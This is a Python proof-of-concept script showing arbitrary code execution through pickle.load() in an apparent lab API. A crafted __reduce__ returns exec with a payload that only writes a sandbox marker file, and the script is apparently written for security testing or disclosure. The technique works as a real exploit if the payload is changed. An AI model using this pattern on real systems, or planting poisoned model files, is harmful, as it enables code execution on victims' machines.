"""PoC #1 - insecure deserialization.

The app loads its models with pickle.load() at startup. pickle runs an object's
__reduce__ while unpickling, so anyone who can supply a model file (an untrusted
source, or an overwrite via the path-traversal bug) gets code execution in the
API process.

To show this safely we build a pickle whose payload only writes a marker file,
then load it the same way the app loads a model. No shell, no network.
"""
import os
import sys
import pickle

SANDBOX = os.environ.get("SANDBOX", os.path.join(os.path.dirname(__file__), "..", "sandbox"))
SANDBOX = os.path.abspath(SANDBOX)
MARKER = os.path.join(SANDBOX, "PWNED_PICKLE.txt")
EVIL_PKL = os.path.join(SANDBOX, "evil_model.pkl")


class MaliciousModel:
    """When unpickled, __reduce__ runs our benign payload instead of rebuilding
    a normal object. A real attacker would put anything here; we only write a
    marker file to prove code executed."""
    def __reduce__(self):
        # exec() is a builtin (picklable by reference). The string only writes a
        # marker file - deliberately harmless.
        payload = (
            "import os;"
            "os.makedirs(r'%s', exist_ok=True);"
            "open(r'%s','w').write('ARBITRARY CODE EXECUTED VIA pickle.load()\\n')"
            % (SANDBOX, MARKER)
        )
        return (exec, (payload,))


def main():
    os.makedirs(SANDBOX, exist_ok=True)
    if os.path.exists(MARKER):
        os.remove(MARKER)

    # 1) Attacker crafts the poisoned "model" file.
    with open(EVIL_PKL, "wb") as f:
        pickle.dump(MaliciousModel(), f)
    print(f"[*] Wrote poisoned model file: {EVIL_PKL}")

    # 2) Victim loads it exactly like lab_access_api.py does:
    #        with open(path,'rb') as f: model = pickle.load(f)
    print("[*] Victim calls pickle.load() on the untrusted model file...")
    with open(EVIL_PKL, "rb") as f:
        _ = pickle.load(f)

    # 3) Proof of code execution.
    if os.path.exists(MARKER):
        print(f"[+] SUCCESS: code ran during pickle.load(). Marker: {MARKER}")
        print("    contents:", repr(open(MARKER).read()))
        return 0
    print("[-] Marker not found - payload did not execute.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
